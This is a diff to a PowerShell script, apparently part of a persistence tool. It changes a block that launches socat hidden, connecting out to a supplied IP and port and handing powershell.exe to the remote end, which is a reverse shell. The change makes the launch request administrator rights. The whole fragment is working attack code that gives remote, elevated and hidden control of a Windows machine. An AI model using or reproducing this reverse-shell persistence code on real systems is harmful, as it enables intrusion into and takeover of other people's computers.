@@ -17,15 +17,10 @@ Write-Host "Created Port Persistance"
 
 $scriptBlock = [Scriptblock]::Create(@'
 if(Get-Process -Name socat){
-	Write-Host "socat running..."
-	
-	
 	
 }else{
-	Write-Host "runnin' exploit"	
-	
-	powershell.exe -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes
-	
+
+	Start-Process powershell.exe -Verb runAs -FilePath 'powershell.exe -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes'	
 
 }
 '@)
